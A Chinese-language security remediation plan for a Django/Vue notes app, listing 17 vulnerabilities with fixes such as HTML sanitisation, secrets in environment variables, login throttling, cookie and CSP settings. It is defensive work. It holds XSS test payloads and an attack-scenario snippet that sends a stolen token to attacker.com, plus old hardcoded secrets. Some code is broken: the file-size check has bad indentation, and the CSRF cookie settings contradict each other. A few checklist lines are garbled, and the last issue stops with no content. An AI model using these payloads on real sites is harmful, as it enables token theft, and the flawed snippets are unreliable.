# 🔒 P0 安全漏洞修复方案

## 📊 问题清单与修复优先级

| 问题 | 风险等级 | 位置 | 影响 | 发现时间 |
|------|---------|------|------|---------|
| 1. 存储型 XSS（已修复） | ✅ 已完成 | serializers.py, 数据迁移, 自动化测试 | 已净化 Markdown HTML 并覆盖存量数据 | 2026-06-23 |
| 2. SECRET_KEY / 数据库密码硬编码（已修复） | ✅ 已完成 | settings.py, backend/.env, .env.example | 已迁移到环境变量读取 | 2026-06-23 |
| 3. DEBUG / ALLOWED_HOSTS 安全配置（已修复） | ✅ 已完成 | settings.py, backend/.env, .env.example | 开发环境显式配置，生产环境启用安全项 | 2026-06-23 |
| 4. 登录暴力破解（已修复） | ✅ 已完成 | accounts/views.py, accounts/throttles.py, accounts/tests.py | 已添加 IP 限流并统一失败提示 | 2026-06-23 |
| 5. migrate 自动重置密码（已修复） | ✅ 已完成 | accounts/signals.py, accounts/tests.py | 已改为仅创建时设置默认密码 | 2026-06-23 |
| 6. 文件上传无大小限制（已修复） | ✅ 已完成 | settings.py, serializers.py, tests.py | 已限制 Markdown 上传大小为 10 MB | 2026-06-23 |
| 7. 缺少 CORS 配置 | 🟡 Medium | settings.py | 生产环境可能导致跨域攻击 | 2026-06-24 |
| 8. JWT Token 存储在 localStorage | 🟡 Medium | LoginView.vue, api.js, router/index.js | XSS 攻击可窃取 token | 2026-06-24 |
| 9. Refresh Token 无过期时间限制 | 🟡 Medium | settings.py | 长期有效的 token 增加被盗用风险 | 2026-06-24 |
| 10. 缺少 CSRF Token 保护 | 🟡 Medium | settings.py, api.js | API 可能受到 CSRF 攻击 | 2026-06-24 |
| 11. Session Cookie 未配置 SameSite | 🟡 Medium | settings.py | 可能受到 CSRF 攻击 | 2026-06-24 |
| 12. 缺少 Content-Security-Policy | 🟡 Medium | settings.py | 无法防御 XSS、点击劫持等攻击 | 2026-06-24 |
| 13. 缺少请求体大小限制 | 🟢 Low | settings.py | DoS 攻击风险 | 2026-06-24 |
| 14. 依赖项可能存在已知漏洞 | 🟢 Low | requirements.txt | 依赖第三方库的安全性 | 2026-06-24 |
| 15. 缺少日志记录 | 🟢 Low | 全局 | 难以追踪安全事件 | 2026-06-24 |
| 16. 敏感操作无审计日志 | 🟢 Low | views.py | 无法追踪删除、恢复等操作 | 2026-06-24 |
| 17. 文件路径遍历风险 | 🟢 Low | notes/views.py | 上传文件的路径处理 | 2026-06-24 |

---

## 🛠️ 修复方案详解

### **修复 1: 存储型 XSS 漏洞**

**问题描述：** Markdown 渲染成 HTML 后直接展示，没有过滤恶意脚本。攻击者可以通过上传包含 `<script>` 标签的 Markdown 文件来执行恶意代码。

#### 修复步骤

**1. 安装 HTML 净化库**

```bash
cd backend
source ../.venv/bin/activate  # Windows: ..\.venv\Scripts\activate
pip install bleach
```

**2. 修改 `backend/notes/serializers.py`**

找到第 14-18 行的 `render_markdown_content` 函数，替换为以下代码：

```python
import bleach

def render_markdown_content(markdown_content):
    """
    渲染 Markdown 为 HTML 并进行安全净化
    防止存储型 XSS 攻击
    """
    # 先渲染 Markdown
    html = markdown.markdown(
        markdown_content,
        extensions=['extra', 'fenced_code', 'tables', 'toc'],
    )
    
    # 净化 HTML，只允许安全的标签和属性
    allowed_tags = [
        # 标题
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        # 段落和换行
        'p', 'br', 'hr',
        # 文本格式
        'strong', 'em', 'u', 's', 'del', 'ins',
        # 链接和图片
        'a', 'img',
        # 列表
        'ul', 'ol', 'li',
        # 引用和代码
        'blockquote', 'pre', 'code',
        # 表格
        'table', 'thead', 'tbody', 'tr', 'th', 'td',
        # 容器
        'div', 'span',
    ]
    
    allowed_attributes = {
        'a': ['href', 'title', 'target'],
        'img': ['src', 'alt', 'title', 'width', 'height'],
        'code': ['class'],  # 用于代码高亮的语言类名
        'pre': ['class'],
        'div': ['class'],
        'span': ['class'],
    }
    
    allowed_protocols = ['http', 'https', 'mailto']
    
    clean_html = bleach.clean(
        html,
        tags=allowed_tags,
        attributes=allowed_attributes,
        protocols=allowed_protocols,
        strip=True,  # 移除不允许的标签，保留内容
    )
    
    return clean_html
```

**3. 更新依赖文件**

```bash
pip freeze > requirements.txt
```

**4. 测试验证**

创建一个包含以下内容的测试文件 `test_xss.md`：

```markdown
# 测试 XSS 防护

正常内容：这是一段正常的文本。

恶意脚本测试（应该被过滤）：
<script>alert('XSS')</script>

<img src="x" onerror="alert('XSS')">

<a href="javascript:alert('XSS')">点击我</a>
```

上传后查看渲染结果，确认恶意脚本已被移除。

---

### **修复 2: SECRET_KEY 和数据库密码环境变量化**

**问题描述：** 密钥和密码硬编码在 `settings.py` 中，提交到 Git 会泄露给所有能访问代码的人。

#### 修复步骤

**1. 安装环境变量管理库**

```bash
cd backend
pip install python-decouple
```

**2. 创建 `.env` 文件**

在 `backend/` 目录下创建 `.env` 文件（**重要：此文件不要提交到 Git**）：

```bash
# Django 核心配置
SECRET_KEY=django-insecure-54ezmdv+e8@3ynq2#!v(#f_)v=m#l83^urnx-4c6-ckvvnz0e&
DEBUG=True
ALLOWED_HOSTS=localhost,127.0.0.1

# 数据库配置
DB_NAME=moonsbirdnotrs_db
DB_USER=root
DB_PASSWORD=123456
DB_HOST=127.0.0.1
DB_PORT=3306

# 管理员配置
ADMIN_USERNAME=moodbird
ADMIN_PASSWORD=123456
```

**3. 生成新的强随机密钥**

```bash
python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())"
```

将输出的密钥复制到 `.env` 文件的 `SECRET_KEY=` 后面，替换掉原来的值。

**4. 修改 `backend/MoonBirdNotes/settings.py`**

在文件开头（第 13 行 `from datetime import timedelta` 后面）添加导入：

```python
from datetime import timedelta
from pathlib import Path
from decouple import config, Csv  # 新增这一行
```

然后替换以下内容：

**原代码（第 18-22 行）：**
```python
SECRET_KEY = 'django-insecure-54ezmdv+e8@3ynq2#!v(#f_)v=m#l83^urnx-4c6-ckvvnz0e&'

DEBUG = True

ALLOWED_HOSTS = ['*']
```

**新代码：**
```python
# 从环境变量读取配置（开发时从 .env 文件读取）
SECRET_KEY = config('SECRET_KEY')
DEBUG = config('DEBUG', default=False, cast=bool)
ALLOWED_HOSTS = config('ALLOWED_HOSTS', default='', cast=Csv())
```

**原代码（第 65-77 行）：**
```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'moonsbirdnotrs_db',
        'USER': 'root',
        'PASSWORD': '123456',
        'HOST': '127.0.0.1',
        'PORT': '3306',
        'OPTIONS': {
            'charset': 'utf8mb4',
        },
    }
}
```

**新代码：**
```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': config('DB_NAME'),
        'USER': config('DB_USER'),
        'PASSWORD': config('DB_PASSWORD'),
        'HOST': config('DB_HOST', default='127.0.0.1'),
        'PORT': config('DB_PORT', default='3306'),
        'OPTIONS': {
            'charset': 'utf8mb4',
        },
    }
}
```

**原代码（第 124-125 行）：**
```python
ADMIN_USERNAME = 'moodbird'
ADMIN_PASSWORD = '123456'
```

**新代码：**
```python
ADMIN_USERNAME = config('ADMIN_USERNAME')
ADMIN_PASSWORD = config('ADMIN_PASSWORD')
```

**5. 确保 `.env` 在 `.gitignore` 中**

检查项目根目录的 `.gitignore` 文件，确认包含以下内容（已在之前添加）：

```
# Environment variables
.env
.env.local
.env.*.local
```

**6. 创建 `.env.example` 模板文件**

在 `backend/` 目录下创建 `.env.example` 文件作为配置模板（此文件可以提交到 Git）：

```bash
# Django 核心配置
SECRET_KEY=your-secret-key-here-generate-with-get_random_secret_key
DEBUG=True
ALLOWED_HOSTS=localhost,127.0.0.1

# 数据库配置
DB_NAME=moonsbirdnotrs_db
DB_USER=root
DB_PASSWORD=your-database-password
DB_HOST=127.0.0.1
DB_PORT=3306

# 管理员配置
ADMIN_USERNAME=your-admin-username
ADMIN_PASSWORD=your-admin-password
```

**7. 更新依赖文件**

```bash
pip freeze > requirements.txt
```

**8. 测试验证**

```bash
# 重启 Django 服务
python manage.py runserver

# 访问后台确认配置生效
# 如果报错 "SECRET_KEY not found"，说明配置成功，需要检查 .env 文件
```

---

### **修复 3: DEBUG 和 ALLOWED_HOSTS 安全配置**

**问题描述：**
- `DEBUG=True` 会在出错时暴露详细的错误信息、代码路径、环境变量等敏感信息
- `ALLOWED_HOSTS=['*']` 允许任何域名访问，容易被 Host Header 攻击

#### 修复步骤

**1. 在 `.env` 中配置（开发环境）**

```bash
DEBUG=True
ALLOWED_HOSTS=localhost,127.0.0.1
```

**2. 在 `settings.py` 末尾添加安全配置**

在 `backend/MoonBirdNotes/settings.py` 文件末尾（第 126 行后）添加：

```python
# ===== 安全配置 =====

# 缓存配置（用于限流计数）
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.locmem.LocMemCache',
        'LOCATION': 'unique-snowflake',
    }
}

# 文件上传安全限制
DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024  # 10 MB
FILE_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024  # 10 MB

# 生产环境安全配置（DEBUG=False 时自动启用）
if not DEBUG:
    # HTTPS 安全
    SECURE_SSL_REDIRECT = True
    SESSION_COOKIE_SECURE = True
    CSRF_COOKIE_SECURE = True
    
    # 安全响应头
    SECURE_BROWSER_XSS_FILTER = True
    SECURE_CONTENT_TYPE_NOSNIFF = True
    X_FRAME_OPTIONS = 'DENY'
    
    # HSTS（强制 HTTPS，启用前请确认已配置 SSL）
    SECURE_HSTS_SECONDS = 31536000  # 1 年
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True
    SECURE_HSTS_PRELOAD = True
    
    # 日志配置（生产环境）
    LOGGING = {
        'version': 1,
        'disable_existing_loggers': False,
        'handlers': {
            'file': {
                'level': 'ERROR',
                'class': 'logging.FileHandler',
                'filename': BASE_DIR / 'logs' / 'error.log',
            },
        },
        'loggers': {
            'django': {
                'handlers': ['file'],
                'level': 'ERROR',
                'propagate': True,
            },
        },
    }
```

**3. 生产环境配置示例**

当部署到生产环境时，修改 `.env` 为：

```bash
DEBUG=False
ALLOWED_HOSTS=yourdomain.com,www.yourdomain.com
```

---

### **修复 4: 登录暴力破解防护**

**问题描述：** 没有登录限流，攻击者可以无限次尝试密码进行暴力破解。

#### 修复步骤

**1. 使用 DRF 内置限流能力**

未新增第三方依赖，新增 `backend/accounts/throttles.py`，基于 `SimpleRateThrottle` 按客户端 IP 统计登录请求。

**2. 修改 `backend/accounts/views.py`**

登录视图挂载 `AdminLoginRateThrottle`，每个 IP 默认每分钟最多 5 次登录尝试，超出后返回 `429 Too Many Requests`。

**3. 在 `settings.py` 中配置限流速率和缓存**

新增 `ADMIN_LOGIN_THROTTLE_RATE`，默认值为 `5/minute`；同时显式配置本地缓存用于限流计数。

**4. 统一登录失败提示**

`backend/accounts/serializers.py` 不再区分“用户不存在 / 密码错误 / 非管理员 / 禁用账号”，统一返回 `用户名或密码错误。`，避免通过登录接口枚举用户名。

**5. 测试验证**

`backend/accounts/tests.py` 已覆盖：

- 登录视图挂载了限流器
- 同一 IP 连续第 6 次登录尝试会被拒绝
- 不同 IP 使用独立限流桶

---

### **修复 5: migrate 自动重置密码问题**

**问题描述：** 每次运行 `python manage.py migrate` 时，如果管理员密码与配置文件不一致，就会自动重置为配置文件中的密码。这会导致已修改的密码被意外覆盖。

#### 修复步骤

**修改 `backend/accounts/signals.py`**

完整替换文件内容：

```python
from django.conf import settings
from django.contrib.auth import get_user_model
from django.db.models.signals import post_migrate
from django.db.utils import OperationalError, ProgrammingError
from django.dispatch import receiver


@receiver(post_migrate)
def ensure_default_superuser(sender, **kwargs):
    """
    确保默认超级管理员账号存在
    注意：只在创建时设置密码，不会重置已存在用户的密码
    """
    try:
        user_model = get_user_model()
        admin_user, created = user_model.objects.get_or_create(
            username=settings.ADMIN_USERNAME,
            defaults={
                'is_staff': True,
                'is_superuser': True,
                'is_active': True,
            },
        )
    except (OperationalError, ProgrammingError):
        return

    updated = False

    # 只在创建时设置密码，避免每次 migrate 都重置密码
    if created:
        admin_user.set_password(settings.ADMIN_PASSWORD)
        updated = True
        print(f'✅ 已创建超级管理员账号: {settings.ADMIN_USERNAME}')
    
    # 确保权限正确（即使账号已存在也检查）
    if not admin_user.is_staff:
        admin_user.is_staff = True
        updated = True

    if not admin_user.is_superuser:
        admin_user.is_superuser = True
        updated = True

    if not admin_user.is_active:
        admin_user.is_active = True
        updated = True

    if updated:
        admin_user.save()
        if not created:
            print(f'✅ 已更新超级管理员权限: {settings.ADMIN_USERNAME}')
```

---

### **修复 6: 文件上传大小限制**

**问题描述：** 没有限制上传文件大小，攻击者可以上传超大文件导致磁盘空间耗尽或内存溢出。

#### 修复步骤

**1. 在 `settings.py` 中添加全局限制**

（已在修复 3 中添加）

```python
# 文件上传安全限制
DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024  # 10 MB
FILE_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024  # 10 MB
```

**2. 修改 `backend/notes/serializers.py`**

找到 `NoteUploadSerializer` 类中的 `validate_file` 方法（第 127-131 行），替换为：

```python
def validate_file(self, value):
    """
    验证上传的文件
    1. 只允许 .md 文件
      2. 文件大小不超过 10 MB
    """
    # 检查文件后缀
    suffix = Path(value.name).suffix.lower()
    if suffix != '.md':
        raise serializers.ValidationError('只允许上传 .md 文件。')
    
      # 检查文件大小（最大 10MB）
      max_size = 10 * 1024 * 1024  # 10 MB
      if value.size > max_size:
          size_mb = value.size / 1024 / 1024
          raise serializers.ValidationError(
              f'文件大小不能超过 10 MB，当前文件：{size_mb:.2f} MB'
          )
    
    return value
```

**3. 测试验证**

  尝试上传一个超过 10MB 的 .md 文件，应该返回错误提示。

---

## 📋 实施清单

### 第一阶段：环境变量化（最重要）⚠️

- [x] 安装 python-decouple`r
- [x] 创建 ackend/.env 文件
- [x] 生成新的 SECRET_KEY
- [x] 修改 settings.py 使用环境变量
- [x] 创建 ackend/.env.example 模板
- [x] 测试应用启动正常
- [x] 确认 .env 已在 .gitignore 中

### 第二阶段：XSS 防护

- [x] 安装 `bleach`
- [x] 修改 `serializers.py` 中的 `render_markdown_content` 函数
- [x] 添加自动化测试验证 XSS 过滤
- [x] 测试正常 Markdown 渲染不受影响

### 第三阶段：DEBUG / ALLOWED_HOSTS 安全配置

- [x] 在 `settings.py` 中配置 DEBUG 和 ALLOWED_HOSTS
- [x] 添加生产环境安全响应头配置
- [ ] 创建 `logs` 目录（生产环境用）

### 第四阶段：登录安全

- [x] 使用 DRF 内置限流能力添加登录 IP 限流
- [x] 修改 `accounts/views.py` 挂载登录限流器
- [x] 在 `settings.py` 中配置限流速率和缓存
- [x] 统一登录失败提示，降低用户名枚举风险
- [x] 添加自动化测试验证连续登录失败被限制

### 第五阶段：密码管理

- [x] 修改 `accounts/signals.py` 防止自动重置密码
- [x] 测试 migrate 命令不会重置已有密码

### 第六阶段：文件上传

- [x] 修改 `serializers.py` 添加文件大小验证
- [x] 在 `settings.py` 中配置全局上传限制
- [x] 测试上传大文件被拒绝

### 第七阶段：文档和提交

- [ ] 更新 `requirements.txt`
- [ ] 更新 `TODO.md`，标记安全修复已完成
- [ ] 提交所有代码更改（不包括 `.env`）

---

## 🔍 新发现的安全问题（2026-06-24）

### **问题 7: 缺少 CORS 配置**

**风险等级：** 🟡 Medium

**问题描述：** 项目未配置 CORS（跨域资源共享）策略，生产环境部署后可能被恶意网站跨域访问 API。

**受影响文件：**
- `backend/MoonBirdNotes/settings.py`

**潜在攻击场景：**
- 恶意网站可能利用已登录用户的身份跨域调用 API
- 配合 XSS 攻击窃取数据

**修复方案：**

1. 安装 `django-cors-headers`：
```bash
pip install django-cors-headers
```

2. 在 `settings.py` 中添加配置：

```python
INSTALLED_APPS = [
    # ...
    'corsheaders',  # 添加在 CommonMiddleware 之前
    # ...
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'corsheaders.middleware.CorsMiddleware',  # 添加在这里，尽可能靠前
    'django.middleware.common.CommonMiddleware',
    # ...
]

# 开发环境允许前端开发服务器
if DEBUG:
    CORS_ALLOWED_ORIGINS = [
        'http://localhost:5173',
        'http://127.0.0.1:5173',
    ]
else:
    # 生产环境只允许你的域名
    CORS_ALLOWED_ORIGINS = config('CORS_ALLOWED_ORIGINS', default='', cast=Csv())

CORS_ALLOW_CREDENTIALS = True
```

3. 在 `.env.example` 中添加：
```bash
# CORS 配置（生产环境）
CORS_ALLOWED_ORIGINS=https://yourdomain.com,https://www.yourdomain.com
```

---

### **问题 8: JWT Token 存储在 localStorage**

**风险等级：** 🟡 Medium

**问题描述：** Access Token 和 Refresh Token 存储在 `localStorage` 中，容易被 XSS 攻击窃取。

**受影响文件：**
- `frontend/moonsbirdnotrs_vue/src/views/LoginView.vue:52-54`
- `frontend/moonsbirdnotrs_vue/src/services/api.js`
- `frontend/moonsbirdnotrs_vue/src/router/index.js:69`
- `frontend/moonsbirdnotrs_vue/src/components/WorkspaceShell.vue:34-36`

**潜在攻击场景：**
```javascript
// XSS 攻击者可以直接读取 token
const token = localStorage.getItem('access_token')
// 然后发送到攻击者服务器
fetch('https://attacker.com/steal', { 
  method: 'POST', 
  body: JSON.stringify({ token }) 
})
```

**修复方案（推荐方案）：**

**方案 A：使用 HttpOnly Cookie（最安全）**

1. 修改后端 `accounts/views.py`：
```python
from django.conf import settings

class AdminLoginView(TokenObtainPairView):
    permission_classes = [AllowAny]
    serializer_class = AdminLoginSerializer
    throttle_classes = [AdminLoginRateThrottle]
    
    def post(self, request, *args, **kwargs):
        response = super().post(request, *args, **kwargs)
        
        # 将 token 存储在 HttpOnly Cookie 中
        if response.status_code == 200:
            access_token = response.data.get('access')
            refresh_token = response.data.get('refresh')
            
            # 设置 HttpOnly Cookie（JavaScript 无法访问）
            response.set_cookie(
                'access_token',
                access_token,
                max_age=30 * 60,  # 30 分钟
                httponly=True,  # 防止 XSS
                secure=not settings.DEBUG,  # 生产环境强制 HTTPS
                samesite='Lax',  # 防止 CSRF
            )
            
            response.set_cookie(
                'refresh_token',
                refresh_token,
                max_age=7 * 24 * 60 * 60,  # 7 天
                httponly=True,
                secure=not settings.DEBUG,
                samesite='Lax',
            )
            
            # 从响应体中移除 token（前端不需要存储）
            response.data = {
                'user': response.data.get('user')
            }
        
        return response
```

2. 修改前端 `api.js`，从 Cookie 读取 token：
```javascript
// 后端会自动在 Cookie 中带上 token，前端不需要手动处理
// 删除 localStorage.setItem('access_token', ...)
// 删除 localStorage.getItem('access_token')

// axios 配置自动发送 cookie
const api = axios.create({
  baseURL: '/api',
  timeout: 10000,
  withCredentials: true,  // 允许发送 Cookie
})

// 不再需要手动添加 Authorization header
// 后端从 Cookie 中读取 token
```

3. 修改后端认证类，从 Cookie 读取 token：
```python
# 创建 backend/accounts/authentication.py
from rest_framework_simplejwt.authentication import JWTAuthentication

class CookieJWTAuthentication(JWTAuthentication):
    def authenticate(self, request):
        # 优先从 Cookie 读取
        raw_token = request.COOKIES.get('access_token')
        
        if raw_token is None:
            # 回退到 Authorization header（用于 API 客户端）
            return super().authenticate(request)
        
        validated_token = self.get_validated_token(raw_token)
        return self.get_user(validated_token), validated_token
```

4. 在 `settings.py` 中使用新的认证类：
```python
REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': (
        'accounts.authentication.CookieJWTAuthentication',
    ),
    'DEFAULT_PERMISSION_CLASSES': (
        'rest_framework.permissions.IsAuthenticated',
    ),
}
```

**方案 B：保持 localStorage 但增强防护（次优）**

如果无法改用 HttpOnly Cookie，则需要：
1. 实施严格的 CSP 策略（见问题 12）
2. 对所有用户输入进行严格的 XSS 过滤
3. 缩短 token 有效期至 5-15 分钟
4. 添加 token 指纹绑定（IP + User-Agent）

---

### **问题 9: Refresh Token 过期时间过长**

**风险等级：** 🟡 Medium

**问题描述：** Refresh Token 有效期为 7 天，一旦泄露攻击者可以长期访问账户。

**受影响文件：**
- `backend/MoonBirdNotes/settings.py:133`

**修复方案：**

```python
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=15),  # 从 30 分钟缩短到 15 分钟
    'REFRESH_TOKEN_LIFETIME': timedelta(days=1),     # 从 7 天缩短到 1 天
    'ROTATE_REFRESH_TOKENS': True,                   # 刷新时生成新的 refresh token
    'BLACKLIST_AFTER_ROTATION': True,                # 旧 token 加入黑名单
    'AUTH_HEADER_TYPES': ('Bearer',),
    
    # 增强安全性配置
    'UPDATE_LAST_LOGIN': True,
    'AUTH_TOKEN_CLASSES': ('rest_framework_simplejwt.tokens.AccessToken',),
}
```

**需要安装 token 黑名单功能：**

1. 在 `INSTALLED_APPS` 中添加：
```python
INSTALLED_APPS = [
    # ...
    'rest_framework_simplejwt.token_blacklist',
]
```

2. 运行迁移：
```bash
python manage.py migrate
```

3. 添加登出 API（将 token 加入黑名单）：
```python
# backend/accounts/views.py
from rest_framework_simplejwt.tokens import RefreshToken
from rest_framework.views import APIView

class AdminLogoutView(APIView):
    permission_classes = [IsAuthenticated]
    
    def post(self, request):
        try:
            refresh_token = request.data.get('refresh_token')
            if refresh_token:
                token = RefreshToken(refresh_token)
                token.blacklist()
            return Response({'detail': '登出成功。'}, status=status.HTTP_200_OK)
        except Exception:
            return Response({'detail': '登出失败。'}, status=status.HTTP_400_BAD_REQUEST)
```

---

### **问题 10: 缺少 CSRF Token 保护**

**风险等级：** 🟡 Medium

**问题描述：** 前端使用 JWT 认证但未发送 CSRF token，虽然 JWT 本身可以防御 CSRF，但 Django 的 `CsrfViewMiddleware` 仍然会检查。

**受影响文件：**
- `backend/MoonBirdNotes/settings.py:43`
- `frontend/moonsbirdnotrs_vue/src/services/api.js`

**当前状态分析：**
- Django 默认启用了 `CsrfViewMiddleware`
- REST framework 对使用 JWT 的请求会豁免 CSRF 检查
- 但这是**隐式豁免**，不够明确

**修复方案：**

**方案 A：显式配置 CSRF 豁免（推荐用于纯 API 项目）**

在 `settings.py` 中：
```python
# 对于纯 API 项目，可以为 /api/ 路径豁免 CSRF
CSRF_TRUSTED_ORIGINS = []  # 生产环境添加你的域名

# 或者完全禁用 CSRF（仅当 100% 使用 JWT 时）
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    # 'django.middleware.csrf.CsrfViewMiddleware',  # 注释掉
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
```

**方案 B：前端发送 CSRF Token（如果保留 CsrfViewMiddleware）**

1. 后端生成 CSRF token 端点：
```python
# backend/accounts/views.py
from django.middleware.csrf import get_token
from django.http import JsonResponse

def get_csrf_token(request):
    return JsonResponse({'csrfToken': get_token(request)})
```

2. 前端获取并发送 CSRF token：
```javascript
// api.js
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrftoken='))
  ?.split('=')[1]

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('access_token')
  
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  
  if (csrfToken) {
    config.headers['X-CSRFToken'] = csrfToken
  }
  
  return config
})
```

---

### **问题 11: Session Cookie 未配置 SameSite**

**风险等级：** 🟡 Medium

**问题描述：** Session Cookie 缺少 `SameSite` 属性，可能受到 CSRF 攻击。

**受影响文件：**
- `backend/MoonBirdNotes/settings.py`

**修复方案：**

在 `settings.py` 中添加：
```python
# Session 安全配置
SESSION_COOKIE_SECURE = not DEBUG  # 生产环境强制 HTTPS
SESSION_COOKIE_HTTPONLY = True     # 防止 JavaScript 访问
SESSION_COOKIE_SAMESITE = 'Lax'    # 防止 CSRF（'Strict' 或 'Lax'）
SESSION_COOKIE_AGE = 86400         # 1 天

# CSRF Cookie 安全配置
CSRF_COOKIE_SECURE = not DEBUG
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SAMESITE = 'Lax'
```

---

### **问题 12: 缺少 Content-Security-Policy（CSP）**

**风险等级：** 🟡 Medium

**问题描述：** 未配置 CSP 响应头，无法有效防御 XSS、点击劫持等攻击。

**受影响文件：**
- `backend/MoonBirdNotes/settings.py`

**修复方案：**

1. 安装 `django-csp`：
```bash
pip install django-csp
```

2. 在 `settings.py` 中配置：
```python
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'csp.middleware.CSPMiddleware',  # 添加 CSP 中间件
    # ...
]

# CSP 配置（根据项目实际需求调整）
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = (
    "'self'",
    "'unsafe-inline'",  # 允许内联脚本（Vue 需要）
    "'unsafe-eval'",    # 允许 eval（开发环境，生产环境应移除）
)
CSP_STYLE_SRC = (
    "'self'",
    "'unsafe-inline'",  # 允许内联样式
    'https://fonts.googleapis.com',
)
CSP_FONT_SRC = (
    "'self'",
    'https://fonts.gstatic.com',
    'data:',
)
CSP_IMG_SRC = (
    "'self'",
    'data:',
    'blob:',
)
CSP_CONNECT_SRC = ("'self'",)
CSP_FRAME_ANCESTORS = ("'none'",)  # 防止被嵌入 iframe
CSP_BASE_URI = ("'self'",)
CSP_FORM_ACTION = ("'self'",)

# 开发环境报告模式，生产环境强制执行
if DEBUG:
    CSP_REPORT_ONLY = True
else:
    CSP_REPORT_ONLY = False
```

---

### **问题 13: 缺少请求体大小限制**

**风险等级：** 🟢 Low

**问题描述：** 除了文件上传，其他 API 请求未限制请求体大小，可能导致 DoS 攻击。

**修复方案：**

在 `settings.py` 中添加：
```python
# 全局请求限制
DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024  # 10 MB（已有）
DATA_UPLOAD_MAX_NUMBER_FIELDS = 1000            # 最多 1000 个字段，防止字段溢出攻击
```

---

### **问题 14: 依赖项可能存在已知漏洞**

**风险等级：** 🟢 Low

**问题描述：** 项目依赖未定期检查安全漏洞。

**修复方案：**

1. 使用 `pip-audit` 检查依赖漏洞：
```bash
pip install pip-audit
pip-audit
```

2. 使用 `safety` 检查（替代方案）：
```bash
pip install safety
safety check
```

3. 集成到 CI/CD：
```yaml
# .github/workflows/security.yml
name: Security Check
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      - name: Install dependencies
        run: |
          pip install -r backend/requirements.txt
          pip install pip-audit
      - name: Run security audit
        run: pip-audit
```

4. 定期更新依赖：
```bash
# 每月检查一次
pip list --outdated
pip install --upgrade <package-name>
pip freeze > requirements.txt
```

---

### **问题 15: 缺少日志记录**

**风险等级：** 🟢 Low

**问题描述：** 项目缺少完整的日志记录系统，难以追踪安全事件和调试问题。

**修复方案：**

在 `settings.py` 中添加完整的日志配置：
```python
import os

LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'verbose': {
            'format': '[{levelname}] {asctime} {module} {process:d} {thread:d} {message}',
            'style': '{',
        },
        'simple': {
            'format': '[{levelname}] {message}',
            'style': '{',
        },
    },
    'filters': {
        'require_debug_false': {
            '()': 'django.utils.log.RequireDebugFalse',
        },
        'require_debug_true': {
            '()': 'django.utils.log.RequireDebugTrue',
        },
    },
    'handlers': {
        'console': {
            'level': 'INFO',
            'filters': ['require_debug_true'],
            'class': 'logging.StreamHandler',
            'formatter': 'simple',
        },
        'file_error': {
            'level': 'ERROR',
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': BASE_DIR / 'logs' / 'error.log',
            'maxBytes': 10 * 1024 * 1024,  # 10 MB
            'backupCount': 5,
            'formatter': 'verbose',
        },
        'file_security': {
            'level': 'WARNING',
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': BASE_DIR / 'logs' / 'security.log',
            'maxBytes': 10 * 1024 * 1024,
            'backupCount': 10,
            'formatter': 'verbose',
        },
    },
    'loggers': {
        'django': {
            'handlers': ['console', 'file_error'],
            'level': 'INFO',
        },
        'django.security': {
            'handlers': ['file_security'],
            'level': 'WARNING',
            'propagate': False,
        },
        'accounts': {
            'handlers': ['console', 'file_security'],
            'level': 'INFO',
        },
        'notes': {
            'handlers': ['console', 'file_error'],
            'level': 'INFO',
        },
    },
}

# 确保日志目录存在
os.makedirs(BASE_DIR / 'logs', exist_ok=True)
```

在代码中使用日志：
```python
import logging

logger = logging.getLogger('accounts')

# 记录安全事件
logger.warning(f'Failed login attempt from IP: {request.META.get("REMOTE_ADDR")}')
logger.info(f'User {user.username} logged in successfully')
```

---

### **问题 16: 敏感操作无审计日志**

**风险等级：** 🟢 Low

**问题描述：** 删除、恢复笔记等敏感操作缺少审计日志。

**修复方案：**

在 `notes/views.py` 中添加日志记录：
```python
import logging

logger = logging.getLogger('notes')

class NoteDeleteView(generics.DestroyAPIView):
    # ...
    
    def perform_destroy(self, instance):
        logger.info(
            f'Note moved to trash: id={instance.id}, '
            f'title="{instance.title}", '
            f'user={self.request.user.username}, '
            f'ip={self.request.META.get("REMOTE_ADDR")}'
        )
        instance.is_deleted = True
        instance.deleted_at = timezone.now()
        instance.save(update_fields=['is_deleted', 'deleted_at', 'updated_at'])

class TrashNoteDestroyView(generics.DestroyAPIView):
    # ...
    
    def perform_destroy(self, instance):
        logger.warning(
            f'Note permanently deleted: id={instance.id}, '
            f'title="{instance.title}", '
            f'user={self.request.user.username}, '
            f'ip={self.request.META.get("REMOTE_ADDR")}'
        )
        if instance.markdown_file:
            instance.markdown_file.delete(save=False)
        instance.delete()
```

---

### **问题 17: 文件路径遍历风险（低风险）**

**风险等级：** 🟢 Low

